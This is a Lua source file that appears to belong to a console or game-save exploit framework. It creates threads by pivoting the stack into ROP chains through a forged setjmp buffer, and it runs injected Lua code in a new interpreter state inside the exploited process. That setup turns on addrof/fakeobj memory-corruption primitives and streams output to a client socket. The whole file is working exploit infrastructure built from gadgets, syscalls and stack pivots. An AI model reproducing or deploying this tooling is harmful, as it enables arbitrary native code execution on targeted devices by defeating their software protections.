
thread = {}
thread.__index = thread

function thread.init()
    
    local setjmp = fcall(libc_addrofs.setjmp)

    local jmpbuf_backup = memory.alloc(0x60)

    setjmp(jmpbuf_backup)
    
    local fpu_ctrl_value = memory.read_dword(jmpbuf_backup + 0x40)
    local mxcsr_value = memory.read_dword(jmpbuf_backup + 0x44)

    thread.tid_addr = memory.alloc(0x8)
    thread.jmpbuf = memory.alloc(0x60)

    memory.write_qword(thread.jmpbuf, gadgets["ret"]) -- ret addr
    memory.write_dword(thread.jmpbuf + 0x40, fpu_ctrl_value) -- fpu control word
    memory.write_dword(thread.jmpbuf + 0x44, mxcsr_value) -- mxcsr
end

--
-- thread.run can accept any of the following
--   1) ropchain object
--   2) syscall (eq syscall.write) with parameters
--   3) function addr with parameters
--
function thread.run(obj, ...)
    
    local Thrd_create = fcall(libc_addrofs.Thrd_create)
    
    local self = setmetatable({}, thread)

    local chain = nil
    if obj.stack_base then
        chain = obj
    else
        chain = ropchain({
            fcall_stub_padding_size = 0x50000
        })
        if obj.syscall_no then
            chain:push_syscall_with_ret(obj, ...)
        else
            chain:push_fcall_with_ret(obj, ...)
        end
    end

    -- exit the thread and return retval from last fn invocation
    chain:push_fcall_raw(libc_addrofs.Thrd_exit, function()
        local last_retval = chain.retval_addr[#chain.retval_addr]
        chain:push_set_reg_from_memory("rdi", last_retval)
    end)

    memory.write_qword(thread.jmpbuf+0x10, chain.stack_base) -- rsp - pivot to our ropchain

    memory.write_qword(thread.tid_addr, 0)
    local ret = Thrd_create(thread.tid_addr, libc_addrofs.longjmp, thread.jmpbuf):tonumber()
    if ret ~= 0 then
        error("Thrd_create() error: " .. hex(ret))
    end

    self.tid = memory.read_qword(thread.tid_addr)
    self.chain = chain
    return self
end

function thread:join()

    local Thrd_join = fcall(libc_addrofs.Thrd_join)
    local ret_value = memory.alloc(0x8)

    -- will block until thread finish
    local ret = Thrd_join(self.tid, ret_value):tonumber()
    if ret ~= 0 then
        error("Thrd_join() error: " .. hex(ret))
    end

    return memory.read_qword(ret_value)
end

--
-- opt = {
--    client_fd -- output sink fd for new thread
--    args -- additional data (table) to be passed to new thread
--    close_socket_after_finished -- if thread should close client_fd after it has finished running
-- }
function run_lua_code_in_new_thread(lua_code, opt)

    opt = opt or {}

    local LUA_REGISTRYINDEX = -10000
    local LUA_ENVIRONINDEX = -10001
    local LUA_GLOBALSINDEX = -10002
    local LUA_MULTRET = -1

    local luaL_newstate = fcall(eboot_addrofs.luaL_newstate)
    local luaL_openlibs = fcall(eboot_addrofs.luaL_openlibs)
    local lua_setfield = fcall(eboot_addrofs.lua_setfield)
    local luaL_loadstring = fcall(eboot_addrofs.luaL_loadstring)
    local lua_pushcclosure = fcall(eboot_addrofs.lua_pushcclosure)
    local lua_tolstring = fcall(eboot_addrofs.lua_tolstring)
    local lua_pushstring = fcall(eboot_addrofs.lua_pushstring)
    local lua_pushinteger = fcall(eboot_addrofs.lua_pushinteger)

    local prologue = [[

        package.path = package.path .. ";/savedata0/?.lua"
        
        require "misc"
        require "bit32"
        require "uint64"
        require "struct"
        require "lua"
        require "memory"
        require "ropchain"
        require "syscall"
        require "native"
        require "thread"

        function _deserialize(s)
            local env = setmetatable({uint64 = uint64}, {__index = _G})
            local f = assert(loadstring("return " .. s, "deserialize", "t", env))
            return f()
        end

        function _payload_init()

            local data_from_loader = _deserialize(_data_from_loader)

            local syscall_tbl = data_from_loader.syscall
            data_from_loader.syscall = nil  -- dont copy to global

            native.pivot_handler_rop = data_from_loader.native_pivot_handler_rop
            data_from_loader.native_pivot_handler_rop = nil  -- dont copy to global

            -- copy to global
            for k,v in pairs(data_from_loader) do
                _G[k] = v
            end

            -- copy resolved syscall from loader
            for k,v in pairs(syscall_tbl) do
                if v.fn_addr and v.syscall_no then
                    syscall[k] = fcall(v.fn_addr, v.syscall_no)
                end
            end

            syscall.syscall_wrapper = syscall_tbl.syscall_wrapper
            syscall.syscall_address = syscall_tbl.syscall_address

            -- enable addrof/fakeobj primitives
            lua.setup_victim_table()

            -- enable ability to create thread
            thread.init()
        end

        _payload_init()

        old_print = print
        function print(...)
            local out = prepare_arguments(...) .. "\n"
            if client_fd then
                syscall.write(client_fd, out, #out)
            end
        end
    ]]

    local epilogue = [[
        -- nothing for now
    ]]

    local _data_from_loader = {
        gadgets = gadgets,
        eboot_addrofs = eboot_addrofs,
        libc_addrofs = libc_addrofs,
        eboot_base = eboot_base,
        libc_base = libc_base,
        libkernel_base = libkernel_base,
        PLATFORM = PLATFORM,
        FW_VERSION = FW_VERSION,
        game_name = game_name,
        syscall = syscall,
        native_pivot_handler_rop = native.pivot_handler_rop,
        args = opt.args,
        client_fd = opt.client_fd,
    }

    local finalized_lua_code = string.format("%s\n%s\n%s", prologue, lua_code, epilogue)

    local pivot_handler = gadgets.stack_pivot[2]

    local L = luaL_newstate()
    luaL_openlibs(L)

    lua_pushinteger(L, native.create_cmd_handler());
    lua_setfield(L, LUA_GLOBALSINDEX, "native_cmd_handler");

    lua_pushcclosure(L, pivot_handler.gadget_addr, 1);
    lua_setfield(L, LUA_GLOBALSINDEX, "native_invoke");

    lua_pushstring(L, serialize(_data_from_loader))
    lua_setfield(L, LUA_GLOBALSINDEX, "_data_from_loader");

    local ret = luaL_loadstring(L, finalized_lua_code):tonumber()
    if ret ~= 0 then
        local err = memory.read_null_terminated_string(lua_tolstring(L, -1, 0))
        print(err)
        if opt.client_fd then
            syscall.write(opt.client_fd, err, #err)
        end
        return
    end

    local chain = ropchain({
        fcall_stub_padding_size = 0x50000
    })

    -- run lua code
    chain:push_fcall_with_ret(eboot_addrofs.lua_pcall, L, 0, LUA_MULTRET, 0)

    if opt.client_fd then

        local jmp_table = chain:create_branch(chain.retval_addr[1], "~=", 0)
        local true_target = chain:get_rsp()

        -- if lua_pcall(L, 0, LUA_MULTRET, 0) ~= LUA_OK then
            local string_len = memory.alloc(0x8)
            chain:push_fcall_with_ret(eboot_addrofs.lua_tolstring, L, -1, string_len)

            -- print error to client
            chain:push_syscall_raw(syscall.write, function ()
                chain:push_set_reg_from_memory("rdx", string_len)
                chain:push_set_reg_from_memory("rsi", chain.retval_addr[2])
                chain:push_set_rdi(opt.client_fd)
            end)
        -- end

        local false_target = chain:get_rsp()
        
        memory.write_multiple_qwords(jmp_table, {
            false_target, -- comparison false
            true_target, -- comparison true
        })

        if opt.close_socket_after_finished then
            chain:push_syscall(syscall.close, opt.client_fd)
        end
    end

    -- run rop in new thread
    local thr = thread.run(chain)
    return thr
end